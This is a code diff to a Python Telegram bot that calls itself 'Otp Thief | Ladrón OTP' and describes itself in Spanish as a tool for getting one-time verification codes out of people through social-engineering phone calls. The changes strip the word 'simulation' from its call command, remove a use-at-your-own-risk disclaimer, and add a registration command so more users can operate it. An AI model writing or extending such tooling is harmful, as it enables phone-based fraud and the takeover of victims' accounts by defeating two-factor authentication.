@@ -21,15 +21,14 @@ class TelegramBot:
         chat_id = update.effective_chat.id
         message = (
             "🦾 *Otp Thief | Ladrón OTP* 💻\n\n"
-            "🕶️ Esta herramienta está diseñada para interceptar códigos OTP de llamadas telefónicas "
-            "utilizando tácticas de *ingeniería social* 📱 para obtener códigos de verificación.\n\n"
+            "🕶️ Esta herramienta está diseñada para sacar  códigos OTP atraves de llamadas telefónicas "
+            "utilizando tácticas de *ingeniería social*\n"
             "🚀 *Comandos disponibles:*\n"
             "📌 /start - Mostrar esta introducción\n"
-            "📞 /call - Iniciar una simulación de llamada\n"
+            "📞 /call - Iniciar una  llamada\n"
             "❌ /hangup - Finalizar la llamada activa\n"
-            "🎙️ /convert_to_audio - Generar un mensaje de audio personalizado\n"
-            "\n⚠️ *Uso bajo tu responsabilidad.* 🛡️"
-        )
+            "🎙️ /generate - Generar un mensaje de audio personalizado\n"
+            "🔑 /register - Registrarse para usar el bot\n")
         await update.message.reply_text(message, parse_mode="Markdown")
 
 
@@ -42,7 +41,7 @@ class TelegramBot:
 
         # Verificar si el chat_id está autorizado
         if chat_id not in AUTHORIZED_CHAT_IDS:
-            await send_telegram_message(chat_id, "❌ Sin permisos.")
+            await send_telegram_message(chat_id, "Regístrate para usar este bot. /register")
             return
 
         # Verificar si el usuario ya está en otro paso
